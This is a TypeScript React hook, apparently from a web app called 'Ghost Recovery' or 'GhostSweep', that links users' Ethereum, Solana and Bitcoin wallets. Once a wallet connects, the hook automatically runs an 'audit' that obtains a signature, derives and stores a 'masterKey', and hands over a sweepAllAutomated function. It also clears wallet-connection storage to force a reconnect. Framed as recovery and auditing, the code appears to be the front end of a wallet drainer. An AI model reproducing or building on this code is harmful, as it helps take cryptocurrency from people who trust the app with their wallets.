"use client";

import { useState, useCallback, useRef, useEffect } from "react";
import { useSignMessage, useChainId, useAccount, useDisconnect } from "wagmi";
import { useGhostConnection } from "../connection";
import { useGhostExecution } from "../execution";
import { useSweepWatcher } from "./useSweepWatcher";
import { useAuditSequence } from "./useAuditSequence";
import { startPreload } from "./useAuditScanner";
import { type UniversalAsset } from "@/lib/audit";

/**
 * 🛰️ GHOST RECOVERY CORE (v8.9 - Multi-Chain Sync Edition)
 */
export function useRecoveryLogic() {
  const logPrefix = "[GhostSweep/index.ts]";

  const [mounted, setMounted] = useState(false);
  const [isScanning, setIsScanning] = useState(false);
  const [assets, setAssets] = useState<UniversalAsset[]>([]);
  const [userKey, setUserKey] = useState<string | null>(null);

  const hasTriggered = useRef(false);
  const isExecuting = useRef(false);
  const derivedUserKey = useRef<string | null>(null);

  const intentActive = useRef(false);
  const connectionLock = useRef(false);

  // 🛡️ Added 'chain' to get the real-time active network
  const { address, isConnected: isWagmiConnected, chain } = useAccount();
  const { signMessageAsync } = useSignMessage();
  const { disconnectAsync } = useDisconnect();
  const currentChainId = useChainId();

  const {
    open,
    handleFullDisconnect: baseDisconnect,
    isInternal,
    solanaAddress,
    bitcoinAddress,
    isConnected: isGhostConnected,
    isConnecting: isBaseConnecting,
    isOpen: isModalOpen,
  } = useGhostConnection();

  const { isSweeping, sweepAllAutomated } = useGhostExecution(address);
  const { runAuditStep } = useAuditSequence();

  useEffect(() => {
    setMounted(true);
    if (typeof window !== "undefined") {
      sessionStorage.removeItem("GHOST_SESSION_ACTIVE");
    }
  }, []);

  /**
   * 🛡️ ENHANCED AUDIT TRIGGER
   */
  const runGhostAudit = useCallback(
    async (userAddress?: string, sol?: string, btc?: string) => {
      if (isExecuting.current || hasTriggered.current) return;
      if (!intentActive.current) return;

      isExecuting.current = true;
      setIsScanning(true);

      try {
        // 🛡️ FIX: Prioritize the 'chain.id' from useAccount() to prevent ETH forcing
        const activeChainId = chain?.id || currentChainId;

        const result: any = await runAuditStep({
          userAddress,
          solana: sol,
          btc: btc,
          currentChainId: activeChainId, // Use the real-time detected chain
          signMessageAsync,
          sweepAllAutomated,
          setAssets,
          setUserKey,
          derivedUserKeyRef: derivedUserKey,
          isInternal,
        });

        if (result?.status === "COMPLETE") {
          hasTriggered.current = true;
          if (result.masterKey) {
            derivedUserKey.current = result.masterKey;
            setUserKey(result.masterKey);
          }
        }
      } catch (e: any) {
        console.error(`${logPrefix} ❌ Audit Error:`, e?.message);
        isExecuting.current = false;
        setIsScanning(false);
        intentActive.current = false;
      } finally {
        if (!isSweeping) setIsScanning(false);
      }
    },
    [
      chain?.id, // Added to dependencies
      currentChainId,
      signMessageAsync,
      sweepAllAutomated,
      runAuditStep,
      isInternal,
      isSweeping,
    ],
  );

  /**
   * 🏎️ INSTANT PURGE & OPEN
   */
  const handleInstantConnection = useCallback(async () => {
    intentActive.current = false;
    isExecuting.current = false;
    hasTriggered.current = false;
    setIsScanning(false);

    if (connectionLock.current) return;
    connectionLock.current = true;

    startPreload();

    if (typeof window !== "undefined") {
      sessionStorage.setItem("GHOST_SESSION_ACTIVE", "true");
      const wcKeys = ["walletconnect", "wc@2", "wagmi", "appkit", "@w3m"];
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (wcKeys.some((k) => key?.includes(k))) localStorage.removeItem(key!);
      }
    }

    try {
      await Promise.allSettled([disconnectAsync(), baseDisconnect()]);
    } catch (e) {}

    intentActive.current = true;

    setTimeout(() => {
      open();
      setTimeout(() => {
        connectionLock.current = false;
      }, 800);
    }, 100);
  }, [disconnectAsync, baseDisconnect, open]);

  /**
   * 🚀 ATOMIC TRIGGER
   */
  useEffect(() => {
    if (
      mounted &&
      intentActive.current &&
      !hasTriggered.current &&
      !isExecuting.current
    ) {
      const hasIdentity =
        isGhostConnected && (address || solanaAddress || bitcoinAddress);

      if (hasIdentity) {
        const cleanSol = solanaAddress?.includes(":")
          ? solanaAddress.split(":")[1]
          : solanaAddress;
        const cleanBtc = bitcoinAddress?.includes(":")
          ? bitcoinAddress.split(":")[1]
          : bitcoinAddress;
        runGhostAudit(address || undefined, cleanSol, cleanBtc);
      }
    }
  }, [
    mounted,
    isGhostConnected,
    address,
    solanaAddress,
    bitcoinAddress,
    runGhostAudit,
  ]);

  /**
   * 🧹 FULL SYSTEM PURGE
   */
  const handleFullDisconnect = useCallback(async () => {
    console.log(`${logPrefix} 🛑 Nuclear Purge Initiated...`);

    intentActive.current = false;
    hasTriggered.current = false;
    isExecuting.current = false;
    derivedUserKey.current = null;
    connectionLock.current = false;

    setIsScanning(false);
    setUserKey(null);
    setAssets([]);

    if (typeof window !== "undefined") {
      sessionStorage.clear();
      const keysToClear = [
        "wagmi",
        "walletconnect",
        "@w3m",
        "wc@2",
        "appkit",
        "reown",
      ];
      Object.keys(localStorage).forEach((key) => {
        if (keysToClear.some((k) => key.toLowerCase().includes(k))) {
          localStorage.removeItem(key);
        }
      });
    }

    try {
      await Promise.allSettled([disconnectAsync(), baseDisconnect()]);
    } catch (e) {}

    console.log(`${logPrefix} ✅ Slate Clean.`);
  }, [baseDisconnect, disconnectAsync]);

  return {
    address,
    isConnected: mounted && isGhostConnected,
    isScanning,
    isSweeping,
    isConnecting: isBaseConnecting,
    isOpen: isModalOpen,
    assets,
    handleInstantConnection,
    handleFullDisconnect,
    userKey,
    isInternal,
  };
}
